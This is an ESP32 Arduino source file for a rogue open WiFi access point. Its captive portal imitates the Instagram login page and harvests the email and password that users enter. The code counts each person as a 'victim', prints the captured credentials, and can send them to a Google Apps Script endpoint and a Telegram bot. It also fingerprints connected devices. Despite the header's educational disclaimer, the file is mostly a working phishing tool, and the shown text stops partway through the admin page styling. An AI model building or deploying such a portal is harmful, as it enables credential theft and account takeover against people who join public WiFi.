/*
 * Nexus WiFi Portal System v1.0
 * =============================
 * 
 * Developed by: Muhammad Javed Hussain
 * Release Date: 12 August 2025
 * GitHub Repository: github.com/jvdhussain026/nexus-wifi-portal
 * 
 * License: Apache 2.0
 *   - You are free to use, modify, and distribute this software
 *   - You must include original copyright and license notice
 *   - No warranty provided - use at your own risk
 * 
 * DISCLAIMER:
 * This software is intended for EDUCATIONAL PURPOSES and SECURITY RESEARCH ONLY.
 * Unauthorized use against networks/devices without explicit permission is ILLEGAL.
 * The developer assumes NO LIABILITY for misuse of this tool.
 * 
 * Features:
 * - Advanced captive portal system
 * - Device fingerprinting and tracking
 * - Real-time monitoring via WebSocket
 * - Telegram/Google Sheets integration (optional)
 * - Admin security lockout system
 * 
 * Special Thanks:
 * - ESP32 community for hardware support
 * - Arduino/PlatformIO ecosystem
 * - Open-source contributors
 * 
 * WARNING:
 * This tool demonstrates security vulnerabilities that exist in public WiFi systems.
 * Always obtain written permission before testing on any network.
 */

#include <WiFi.h>
#include <DNSServer.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <HTTPClient.h>
#include <vector>
#include <deque>
#include <ArduinoJson.h>
#include "esp_wifi.h"
#include "tcpip_adapter.h"
#include "esp_task_wdt.h"

// =====================
// FORWARD DECLARATIONS
// =====================
String getDeviceBrowser(String userAgent);
void sendTelegramMessage(String message);
String formatMacAddress(const uint8_t* mac);
String getUptime();
String getDeviceOS(String userAgent);
String getCurrentTime();
String getDeviceInfo(AsyncWebServerRequest *request);
void addSerialLog(String message, String type = "info");
void trackDevice(AsyncWebServerRequest *request);
void sendToGoogleSheets(String email, String pass, String deviceInfo, String mac, String ip);
void printToSerial(String email, String pass, String deviceInfo);
void authenticateDevice(String mac);
bool isDeviceAuthenticated(String mac);

// =====================
// CONFIGURATION SECTION
// =====================
// Rogue Access Point Settings
const char* rogueSSID = "FREE_PUBLIC_WIFI";  // Change to your desired AP name
const char* roguePassword = "";              // Open network
const IPAddress apIP(192, 168, 4, 1);
const byte DNS_PORT = 53;

// Real Wi-Fi Credentials (For internet access)
const char* realSSID = "YOUR_REAL_WIFI_SSID";     // Change to your actual WiFi
const char* realPassword = "YOUR_REAL_WIFI_PASS"; // Change to your actual password

// Google Forms Endpoint (OPTIONAL)
const char* googleScriptUrl = "YOUR_GOOGLE_SCRIPT_URL";  // Set up Google Apps Script first

// Telegram Bot Settings (OPTIONAL)
const char* telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN";  // Create via BotFather
const char* telegramChatID = "YOUR_TELEGRAM_CHAT_ID";      // Get from @userinfobot

// Admin Panel Settings
const char *adminPin = "nexus";          // CHANGE THIS TO YOUR SECURE PIN
const int MAX_ADMIN_ATTEMPTS = 5;
const unsigned long LOCKOUT_TIME = 300000; // 5 minutes

// System Settings
const bool ENABLE_SERIAL_MONITOR = true;
const bool ENABLE_TELEGRAM = false;       // Set true after configuring Telegram
const bool ENABLE_GOOGLE_SHEETS = false;  // Set true after configuring Google Sheets
const bool ENABLE_ADMIN_PANEL = true;
const bool ENABLE_DEVICE_TRACKING = true;
const int MAX_LOGINS = 100;
const int SERIAL_LOG_SIZE = 200;
const int WDT_TIMEOUT = 30;
const int MAX_CONNECTED_DEVICES = 50;

// =====================
// GLOBAL VARIABLES
// =====================
DNSServer dnsServer;
AsyncWebServer server(80);
AsyncWebSocket ws("/ws");

// Temporary configuration (resets on reboot)
String tempTelegramChatID = "";
String tempRealSSID = "";
String tempRealPassword = "";
String tempRogueSSID = "";
bool tempInternetEnabled = true;

struct LoginData {
  String email;
  String password;
  String timestamp;
  String deviceInfo;
  String mac;
  String ip;
};

struct ConnectedDevice {
  String mac;
  String hostname;
  int rssi;
  unsigned long firstSeen;
  unsigned long lastSeen;
  String userAgent;
  String os;
  String ip;
  bool authenticated;
};

struct AdminAttempt {
  String ip;
  String mac;
  String timestamp;
  bool success;
  String userAgent;
};

struct SerialLogEntry {
  String message;
  String timestamp;
  String type;
};

std::vector<LoginData> logins;
std::vector<ConnectedDevice> connectedDevices;
std::vector<AdminAttempt> adminAttempts;
std::deque<SerialLogEntry> serialLog;
unsigned long startTime;
int totalVictims = 0;
int failedAdminAttempts = 0;
unsigned long lastAdminAttempt = 0;
bool adminLocked = false;
unsigned long lockoutStart = 0;
String lockoutRemaining = "";

// =====================
// UTILITY FUNCTIONS
// =====================
String formatMacAddress(const uint8_t* mac) {
    char buf[20];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X", 
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

String getUptime() {
  unsigned long sec = millis() / 1000;
  unsigned int days = sec / 86400;
  sec %= 86400;
  unsigned int hours = sec / 3600;
  sec %= 3600;
  unsigned int mins = sec / 60;
  sec %= 60;

  char buffer[80];
  snprintf(buffer, sizeof(buffer), "%u days, %02u:%02u:%02u", days, hours, mins, sec);
  return String(buffer);
}

String getDeviceOS(String userAgent) {
  if (userAgent.indexOf("iPhone") != -1) return "iOS";
  else if (userAgent.indexOf("iPad") != -1) return "iPadOS";
  else if (userAgent.indexOf("Android") != -1) return "Android";
  else if (userAgent.indexOf("Windows") != -1) return "Windows";
  else if (userAgent.indexOf("Macintosh") != -1) return "macOS";
  else if (userAgent.indexOf("Linux") != -1) return "Linux";
  return "Unknown";
}

String getDeviceBrowser(String userAgent) {
  if (userAgent.indexOf("Chrome") != -1) return "Chrome";
  else if (userAgent.indexOf("Safari") != -1) return "Safari";
  else if (userAgent.indexOf("Firefox") != -1) return "Firefox";
  else if (userAgent.indexOf("Edge") != -1) return "Edge";
  return "Unknown";
}

String getCurrentTime() {
  unsigned long currentMillis = millis();
  unsigned long sec = currentMillis / 1000;
  unsigned int hours = (sec / 3600) % 24;
  unsigned int mins = (sec / 60) % 60;
  unsigned int secs = sec % 60;
  
  char buffer[10];
  snprintf(buffer, sizeof(buffer), "%02u:%02u:%02u", hours, mins, secs);
  return String(buffer);
}

String getDeviceInfo(AsyncWebServerRequest *request) {
  String userAgent = request->getHeader("User-Agent")->value();
  String deviceInfo = "Unknown Device";
  
  if (userAgent.indexOf("iPhone") != -1) deviceInfo = "iPhone";
  else if (userAgent.indexOf("iPad") != -1) deviceInfo = "iPad";
  else if (userAgent.indexOf("Android") != -1) deviceInfo = "Android";
  else if (userAgent.indexOf("Windows") != -1) deviceInfo = "Windows PC";
  else if (userAgent.indexOf("Macintosh") != -1) deviceInfo = "Mac";
  else if (userAgent.indexOf("Linux") != -1) deviceInfo = "Linux PC";
  
  return deviceInfo;
}

void addSerialLog(String message, String type) {
  if (serialLog.size() >= SERIAL_LOG_SIZE) {
    serialLog.pop_front();
  }
  serialLog.push_back({message, getCurrentTime(), type});
  
  String json;
  StaticJsonDocument<200> doc;
  doc["message"] = message;
  doc["timestamp"] = getCurrentTime();
  doc["type"] = type;
  serializeJson(doc, json);
  ws.textAll(json);
}

void trackDevice(AsyncWebServerRequest *request) {
  if (!ENABLE_DEVICE_TRACKING) return;

  String mac = "Unknown";
  String hostname = "Unknown";
  String userAgent = request->getHeader("User-Agent")->value();
  IPAddress remoteIP = request->client()->remoteIP();
  String ipStr = remoteIP.toString();

  wifi_sta_list_t wifi_sta_list;
  tcpip_adapter_sta_list_t adapter_sta_list;
  memset(&wifi_sta_list, 0, sizeof(wifi_sta_list));
  memset(&adapter_sta_list, 0, sizeof(adapter_sta_list));

  if (esp_wifi_ap_get_sta_list(&wifi_sta_list) == ESP_OK) {
      if (tcpip_adapter_get_sta_list(&wifi_sta_list, &adapter_sta_list) == ESP_OK) {
          for (int i = 0; i < adapter_sta_list.num; i++) {
              tcpip_adapter_sta_info_t station = adapter_sta_list.sta[i];
              if (IPAddress(station.ip.addr) == remoteIP) {
                  mac = formatMacAddress(station.mac);
                  break;
              }
          }
      }
  }

  if (request->hasHeader("Host")) {
      hostname = request->getHeader("Host")->value();
  }

  int rssi = WiFi.RSSI();

  bool found = false;
  for (auto &device : connectedDevices) {
    if (device.mac == mac) {
      device.lastSeen = millis();
      device.rssi = rssi;
      found = true;
      break;
    }
  }
  
  if (!found && connectedDevices.size() < MAX_CONNECTED_DEVICES) {
    ConnectedDevice newDevice = {
      mac, 
      hostname, 
      rssi, 
      millis(), 
      millis(),
      userAgent,
      getDeviceOS(userAgent) + " (" + getDeviceBrowser(userAgent) + ")",
      ipStr,
      false
    };
    connectedDevices.push_back(newDevice);
    
    addSerialLog("New device: " + mac + " | OS: " + newDevice.os + " | RSSI: " + String(rssi) + "dBm", "warning");
    
    if (ENABLE_TELEGRAM && WiFi.status() == WL_CONNECTED) {
      String message = "📱 New Device Connected\n";
      message += "⏰ Time: " + getCurrentTime() + "\n";
      message += "📶 MAC: " + mac + "\n";
      message += "🖥 OS: " + newDevice.os + "\n";
      message += "📡 RSSI: " + String(rssi) + " dBm\n";
      message += "🌐 Host: " + hostname + "\n";
      message += "📍 IP: " + ipStr;
      
      sendTelegramMessage(message);
    }
  }
}

// =====================
// NOTIFICATION FUNCTIONS
// =====================
void sendTelegramMessage(String message) {
  if (!ENABLE_TELEGRAM || WiFi.status() != WL_CONNECTED) {
    addSerialLog("Telegram notification failed - WiFi not connected", "error");
    return;
  }

  String chatID = tempTelegramChatID != "" ? tempTelegramChatID : telegramChatID;
  
  HTTPClient http;
  String url = "https://api.telegram.org/bot" + String(telegramBotToken) + "/sendMessage";
  http.begin(url);
  http.addHeader("Content-Type", "application/x-www-form-urlencoded");
  
  String postData = "chat_id=" + chatID + 
                    "&text=" + message + 
                    "&parse_mode=Markdown";
  
  esp_task_wdt_reset();
  http.setTimeout(5000);
  int httpCode = http.POST(postData);

  if (httpCode > 0) {
    addSerialLog("Telegram notification sent", "success");
  } else {
    addSerialLog("Telegram error. HTTP Code: " + String(httpCode), "error");
  }
  http.end();
}

void sendToGoogleSheets(String email, String pass, String deviceInfo, String mac, String ip) {
  if (!ENABLE_GOOGLE_SHEETS || WiFi.status() != WL_CONNECTED) {
    addSerialLog("Google Sheets failed - WiFi not connected", "error");
    return;
  }

  HTTPClient http;
  http.begin(googleScriptUrl);
  http.addHeader("Content-Type", "application/x-www-form-urlencoded");
  String payload = "email=" + email + 
                   "&password=" + pass + 
                   "&device=" + deviceInfo + 
                   "&mac=" + mac +
                   "&ip=" + ip +
                   "&time=" + getCurrentTime();
  
  esp_task_wdt_reset();
  http.setTimeout(5000);
  int httpCode = http.POST(payload);

  if (httpCode > 0) {
    addSerialLog("Data sent to Google Sheets", "success");
  } else {
    addSerialLog("Google Sheets error. HTTP Code: " + String(httpCode), "error");
  }
  http.end();
}

void printToSerial(String email, String pass, String deviceInfo) {
  if (!ENABLE_SERIAL_MONITOR) return;

  totalVictims++;
  
  Serial.println("\n╔══════════════════════════════════════════════════╗");
  Serial.printf("║ 🚨 CREDENTIALS CAPTURED [Victim #%d] 🚨          ║\n", totalVictims);
  Serial.println("╠══════════════════════════════════════════════════╣");
  Serial.printf("║ Time:    %-35s ║\n", getCurrentTime().c_str());
  Serial.printf("║ Device:  %-35s ║\n", deviceInfo.c_str());
  Serial.printf("║ Email:   %-35s ║\n", email.c_str());
  Serial.printf("║ Pass:    %-35s ║\n", pass.c_str());
  Serial.println("╚══════════════════════════════════════════════════╝");
  
  addSerialLog("Credentials captured: " + deviceInfo + " - " + email + ":" + pass, "warning");
}

// =====================
// WEB SOCKET HANDLING
// =====================
void onWebSocketEvent(AsyncWebSocket *server, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len) {
  if (type == WS_EVT_CONNECT) {
    addSerialLog("WebSocket client connected: #" + String(client->id()), "info");
    for (const auto &log : serialLog) {
      String json;
      StaticJsonDocument<200> doc;
      doc["message"] = log.message;
      doc["timestamp"] = log.timestamp;
      doc["type"] = log.type;
      serializeJson(doc, json);
      client->text(json);
    }
  } else if (type == WS_EVT_DISCONNECT) {
    addSerialLog("WebSocket client disconnected: #" + String(client->id()), "info");
  }
}

// =====================
// WIFI EXTENDER FUNCTIONS
// =====================
void authenticateDevice(String mac) {
  for (auto &device : connectedDevices) {
    if (device.mac == mac) {
      device.authenticated = true;
      addSerialLog("Device authenticated: " + mac, "success");
      break;
    }
  }
}

bool isDeviceAuthenticated(String mac) {
  for (const auto &device : connectedDevices) {
    if (device.mac == mac && device.authenticated) {
      return true;
    }
  }
  return false;
}

// =====================
// ADMIN PANEL TEMPLATES
// =====================
// Instagram Login Page
const char loginPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Instagram Login</title>
  <style>
   * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }
    
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
      color: #262626;
      background: linear-gradient(135deg, #833ab4 0%, #fd1d1d 50%, #fcb045 100%);
      background-size: 400% 400%;
      animation: gradientBG 15s ease infinite;
    }
    
    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    
    .container {
      max-width: 350px;
      width: 100%;
      padding: 10px;
      perspective: 1000px;
    }
    
    .login-box {
      background: rgba(255, 255, 255, 0.95);
      border-radius: 16px;
      padding: 30px 25px;
      text-align: center;
      margin-bottom: 15px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
      transform-style: preserve-3d;
      transform: rotateY(0deg);
      transition: transform 0.5s ease;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255,255,255,0.3);
    }
    
    .login-box:hover {
      transform: rotateY(5deg);
    }
    
    .logo {
      margin: 10px auto 20px;
      width: 175px;
      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
    }
    
    .form-group {
      margin-bottom: 12px;
      position: relative;
    }
    
    input {
      width: 100%;
      padding: 14px 12px;
      background: rgba(250, 250, 250, 0.95);
      border: 1px solid #dbdbdb;
      border-radius: 6px;
      font-size: 14px;
      transition: all 0.3s ease;
      outline: none;
    }
    
    input:focus {
      border-color: #a8a8a8;
      box-shadow: 0 0 0 2px rgba(0, 149, 246, 0.2);
    }
    
    button {
      width: 100%;
      background: #0095f6;
      background: linear-gradient(to right, #0095f6, #0064e0);
      border: none;
      border-radius: 8px;
      color: white;
      font-weight: 600;
      padding: 12px;
      margin: 15px 0 5px;
      cursor: pointer;
      font-size: 15px;
      transition: all 0.3s ease;
      box-shadow: 0 4px 10px rgba(0, 149, 246, 0.3);
      position: relative;
      overflow: hidden;
    }
    
    button:after {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
      transition: 0.5s;
    }
    
    button:hover:after {
      left: 100%;
    }
    
    button:active {
      transform: translateY(2px);
      box-shadow: 0 2px 5px rgba(0, 149, 246, 0.3);
    }
    
    .divider {
      margin: 20px 0;
      display: flex;
      align-items: center;
      color: #8e8e8e;
      font-size: 13px;
      font-weight: 600;
    }
    
    .divider::before, .divider::after {
      content: "";
      flex: 1;
      border-bottom: 1px solid #dbdbdb;
    }
    
    .divider::before {
      margin-right: 15px;
    }
    
    .divider::after {
      margin-left: 15px;
    }
    
    .facebook-login {
      color: #385185;
      font-size: 15px;
      font-weight: 600;
      margin: 20px 0 25px;
      display: flex;
      justify-content: center;
      align-items: center;
      cursor: pointer;
      transition: color 0.3s ease;
    }
    
    .facebook-login:hover {
      color: #2d4373;
    }
    
    .facebook-icon {
      font-size: 20px;
      margin-right: 8px;
      font-weight: bold;
    }
    
    .forgot-password {
      color: #00376b;
      font-size: 13px;
      margin-top: 5px;
      display: block;
      text-decoration: none;
      transition: color 0.3s ease;
    }
    
    .forgot-password:hover {
      color: #001d3d;
    }
    
    .signup {
      background: rgba(255, 255, 255, 0.95);
      border-radius: 16px;
      padding: 20px;
      text-align: center;
      font-size: 14px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255,255,255,0.3);
    }
    
    .signup a {
      color: #0095f6;
      font-weight: 600;
      text-decoration: none;
      transition: color 0.3s ease;
    }
    
    .signup a:hover {
      color: #0064e0;
    }
    
    .footer {
      text-align: center;
      margin: 30px 0 15px;
      font-size: 12px;
      color: rgba(255, 255, 255, 0.9);
      text-shadow: 0 1px 2px rgba(0,0,0,0.2);
    }
    
    .app-badges {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-top: 10px;
    }
    
    .badge {
      width: 130px;
      height: 40px;
      background-size: contain;
      background-repeat: no-repeat;
    }
    
    .app-store {
      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 43"><rect fill="black" width="128" height="43" rx="8"/><text fill="white" font-family="Arial" font-size="12" x="10" y="25">App Store</text></svg>');
    }
    
    .play-store {
      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 43"><rect fill="black" width="128" height="43" rx="8"/><text fill="white" font-family="Arial" font-size="12" x="10" y="25">Play Store</text></svg>');
    }
    
    /* Animation for form elements */
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    .form-group, button, .divider, .facebook-login, .forgot-password {
      animation: fadeIn 0.6s ease forwards;
    }
    
    .form-group:nth-child(1) { animation-delay: 0.1s; }
    .form-group:nth-child(2) { animation-delay: 0.2s; }
    button { animation-delay: 0.3s; }
    .divider { animation-delay: 0.4s; }
    .facebook-login { animation-delay: 0.5s; }
    .forgot-password { animation-delay: 0.6s; }
    
    /* Responsive adjustments */
    @media (max-width: 400px) {
      .container {
        padding: 10px;
      }
      .login-box {
        padding: 25px 20px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <div class="logo">
        <svg viewBox="0 0 192 192" width="175" height="60">
          <defs>
            <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="100%">
              <stop offset="0%" stop-color="#833ab4"/>
              <stop offset="50%" stop-color="#fd1d1d"/>
              <stop offset="100%" stop-color="#fcb045"/>
            </linearGradient>
          </defs>
          <circle cx="96" cy="96" r="84" fill="url(#gradient)" stroke="#fff" stroke-width="6"/>
          <circle cx="96" cy="96" r="40" fill="none" stroke="#fff" stroke-width="6"/>
          <circle cx="128" cy="64" r="12" fill="#fff"/>
        </svg>
      </div>
      <form action="/login" method="POST" id="loginForm">
        <div class="form-group">
          <input type="text" name="email" id="email" placeholder="Phone number, username, or email" required autocomplete="username">
        </div>
        <div class="form-group">
          <input type="password" name="pass" id="pass" placeholder="Password" required autocomplete="current-password">
          <a href="#" class="forgot-password">Forgot password?</a>
        </div>
        <button type="submit" id="loginButton">Log In</button>
        <div class="divider">OR</div>
        <div class="facebook-login">
          <span class="facebook-icon">f</span> Log in with Facebook
        </div>
      </form>
    </div>
    <div class="signup">
      Don't have an account? <a href="#">Sign up</a>
    </div>
    <div class="footer">
      Get the app.
      <div class="app-badges">
        <div class="badge app-store"></div>
        <div class="badge play-store"></div>
      </div>
    </div>
  </div>
  
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const form = document.getElementById('loginForm');
      const emailInput = document.getElementById('email');
      const passInput = document.getElementById('pass');
      const loginButton = document.getElementById('loginButton');
      
      // Add focus effects
      emailInput.addEventListener('focus', () => {
        emailInput.style.borderColor = '#a8a8a8';
        emailInput.style.boxShadow = '0 0 0 2px rgba(0, 149, 246, 0.2)';
      });
      
      emailInput.addEventListener('blur', () => {
        emailInput.style.borderColor = '#dbdbdb';
        emailInput.style.boxShadow = 'none';
      });
      
      passInput.addEventListener('focus', () => {
        passInput.style.borderColor = '#a8a8a8';
        passInput.style.boxShadow = '0 0 0 2px rgba(0, 149, 246, 0.2)';
      });
      
      passInput.addEventListener('blur', () => {
        passInput.style.borderColor = '#dbdbdb';
        passInput.style.boxShadow = 'none';
      });
      
      // Form submission
      form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Show loading state
        loginButton.textContent = 'Logging in...';
        loginButton.disabled = true;
        
        // Simulate network delay
        setTimeout(() => {
          form.submit();
        }, 1500);
      });
    });
  </script>
</body>
</html>
)rawliteral";

// Admin login page
const char adminLoginPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>J.A.R.V.I.S. Authentication</title>
  <style>
     :root {
      --primary: #0f4c75;
      --secondary: #3282b8;
      --accent: #00adb5;
      --dark: #1b262c;
      --light: #f0f5f9;
      --danger: #ff414d;
      --success: #4ade80;
    }
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    
    body {
      background: linear-gradient(135deg, var(--dark), #0d2438);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      color: var(--light);
      overflow: hidden;
    }
    
    .particles {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
    }
    
    .particle {
      position: absolute;
      background: var(--accent);
      border-radius: 50%;
      opacity: 0.3;
    }
    
    .login-container {
      background: rgba(15, 30, 45, 0.8);
      backdrop-filter: blur(10px);
      border-radius: 16px;
      padding: 40px;
      width: 90%;
      max-width: 450px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      border: 1px solid rgba(50, 130, 184, 0.2);
      position: relative;
      overflow: hidden;
      transform: translateY(0);
      transition: transform 0.3s ease;
    }
    
    .login-container:hover {
      transform: translateY(-5px);
    }
    
    .login-container::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle, rgba(50,130,184,0.1) 0%, transparent 70%);
      z-index: -1;
    }
    
    .header {
      text-align: center;
      margin-bottom: 30px;
    }
    
    .logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 15px;
      background: linear-gradient(135deg, var(--accent), var(--secondary));
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
    }
    
    .logo::after {
      content: '';
      position: absolute;
      top: -5px;
      left: -5px;
      right: -5px;
      bottom: -5px;
      border-radius: 50%;
      border: 2px solid var(--accent);
      animation: pulse 2s infinite;
    }
    
    @keyframes pulse {
      0% { opacity: 0.8; transform: scale(1); }
      50% { opacity: 0.3; transform: scale(1.1); }
      100% { opacity: 0.8; transform: scale(1); }
    }
    
    .logo-inner {
      width: 50px;
      height: 50px;
      background: var(--dark);
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      color: var(--accent);
      font-size: 24px;
      font-weight: bold;
    }
    
    h1 {
      font-size: 28px;
      margin-bottom: 5px;
      background: linear-gradient(to right, var(--accent), var(--secondary));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    
    .subtitle {
      color: #bbbbbb;
      font-size: 14px;
      letter-spacing: 1px;
    }
    
    .error-message {
      background: rgba(255, 65, 77, 0.2);
      border: 1px solid var(--danger);
      border-radius: 8px;
      padding: 12px;
      margin-bottom: 20px;
      text-align: center;
      font-size: 14px;
      animation: shake 0.5s ease;
    }
    
    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-10px); }
      75% { transform: translateX(10px); }
    }
    
    .form-group {
      margin-bottom: 20px;
      position: relative;
    }
    
    label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      color: #bbbbbb;
    }
    
    input {
      width: 100%;
      padding: 14px 20px 14px 45px;
      background: rgba(30, 45, 60, 0.5);
      border: 1px solid rgba(50, 130, 184, 0.3);
      border-radius: 8px;
      color: var(--light);
      font-size: 16px;
      transition: all 0.3s ease;
    }
    
    input:focus {
      outline: none;
      border-color: var(--accent);
      box-shadow: 0 0 0 3px rgba(0, 173, 181, 0.2);
    }
    
    .icon {
      position: absolute;
      left: 15px;
      top: 40px;
      color: var(--accent);
      font-size: 20px;
    }
    
    .btn {
      width: 100%;
      padding: 14px;
      background: linear-gradient(to right, var(--accent), var(--secondary));
      border: none;
      border-radius: 8px;
      color: white;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
    }
    
    .btn::after {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
      transition: 0.5s;
    }
    
    .btn:hover::after {
      left: 100%;
    }
    
    .btn:active {
      transform: translateY(2px);
    }
    
    .footer-text {
      text-align: center;
      margin-top: 25px;
      font-size: 12px;
      color: #777777;
    }
    
    .version {
      position: absolute;
      bottom: 15px;
      right: 15px;
      font-size: 11px;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="particles" id="particles"></div>
  
  <div class="login-container">
    <div class="header">
      <div class="logo">
        <div class="logo-inner">J</div>
      </div>
      <h1>J.A.R.V.I.S. SYSTEM</h1>
      <div class="subtitle">SECURE ADMIN ACCESS</div>
    </div>
    
    %ERROR_MESSAGE%
    
    <form action="/admin-verify" method="POST">
      <div class="form-group">
        <label for="pin">ENTER SECURITY PIN</label>
        <input type="password" id="pin" name="pin" required autocomplete="off">
        <div class="icon">🔒</div>
      </div>
      <button type="submit" class="btn">AUTHENTICATE</button>
    </form>
    
    <div class="footer-text">For authorized personnel only</div>
    <div class="version">v4.5 | Jarvis Security System</div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      // Create particles
      const particlesContainer = document.getElementById('particles');
      const particleCount = 30;
      
      for (let i = 0; i < particleCount; i++) {
        const particle = document.createElement('div');
        particle.classList.add('particle');
        
        // Random properties
        const size = Math.random() * 5 + 2;
        const posX = Math.random() * 100;
        const posY = Math.random() * 100;
        const duration = Math.random() * 10 + 10;
        const delay = Math.random() * 5;
        
        particle.style.width = ${size}px;
        particle.style.height = ${size}px;
        particle.style.left = ${posX}%;
        particle.style.top = ${posY}%;
        particle.style.animation = float ${duration}s ease-in-out ${delay}s infinite;
        
        particlesContainer.appendChild(particle);
      }
      
      // Add keypress sound effect
      const inputs = document.querySelectorAll('input');
      inputs.forEach(input => {
        input.addEventListener('keydown', function() {
          // Simulate keypress sound (in a real system, we'd play a sound effect)
          this.style.boxShadow = '0 0 0 2px rgba(0, 173, 181, 0.5)';
          setTimeout(() => {
            this.style.boxShadow = '0 0 0 2px rgba(0, 173, 181, 0.2)';
          }, 100);
        });
      });
    });
    
    // Create floating animation
    const style = document.createElement('style');
    style.innerHTML = `
      @keyframes float {
        0% { transform: translate(0, 0) rotate(0deg); opacity: 0.3; }
        50% { transform: translate(${Math.random() * 50 - 25}px, ${Math.random() * 50 - 25}px) rotate(${Math.random() * 360}deg); opacity: 0.6; }
        100% { transform: translate(0, 0) rotate(0deg); opacity: 0.3; }
      }
    `;
    document.head.appendChild(style);
  </script>
</body>
</html>
)rawliteral";

String buildAdminPage() {
  String html = R"rawliteral(
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>J.A.R.V.I.S. - Control Panel</title>
    <style>
      :root {
        --primary: #0f4c75;
        --secondary: #3282b8;
        --accent: #00adb5;
        --dark: #1b262c;
        --light: #f0f5f9;
        --danger: #ff414d;
        --success: #4ade80;
        --warning: #ffb74d;
      }
      
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      }
      
      body {
        background: linear-gradient(135deg, var(--dark), #0d2438);
        color: var(--light);
        min-height: 100vh;
        overflow-x: hidden;
      }
      
      .container {
        max-width: 1400px;
        margin: 0 auto;
        padding: 20px;
      }
      
      header {
        background: rgba(15, 30, 45, 0.8);
        backdrop-filter: blur(10px);
        border-radius: 16px;
        padding: 20px;
        margin-bottom: 20px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border: 1px solid rgba(50, 130, 184, 0.2);
        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      }
      
      .logo {
        display: flex;
        align-items: center;
        gap: 15px;
      }
      
      .logo-icon {
        width: 50px;
        height: 50px;
        background: linear-gradient(135deg, var(--accent), var(--secondary));
        border-radius: 50%;
        display: flex;
        justify-content: center;
        align-items: center;
        font-size: 24px;
        font-weight: bold;
      }
      
      .logo-text h1 {
        font-size: 28px;
        background: linear-gradient(to right, var(--accent), var(--secondary));
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
      }
      
      .logo-text p {
        font-size: 14px;
        color: #bbbbbb;
      }
      
      .system-info {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
        gap: 15px;
        margin-bottom: 20px;
      }
      
      .info-card {
        background: rgba(15, 30, 45, 0.6);
        border-radius: 12px;
        padding: 20px;
        border: 1px solid rgba(50, 130, 184, 0.2);
        transition: transform 0.3s ease;
      }
      
      .info-card:hover {
        transform: translateY(-5px);
      }
      
      .info-card h3 {
        font-size: 16px;
        color: #bbbbbb;
        margin-bottom: 10px;
      }
      
      .info-card .value {
        font-size: 28px;
        font-weight: bold;
        background: linear-gradient(to right, var(--accent), var(--secondary));
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
      }
      
      /* Tab Styling */
      .tabs {
        display: flex;
        background: rgba(15, 30, 45, 0.6);
        border-radius: 12px;
        margin-bottom: 20px;
        overflow: hidden;
      }
      
      .tab-button {
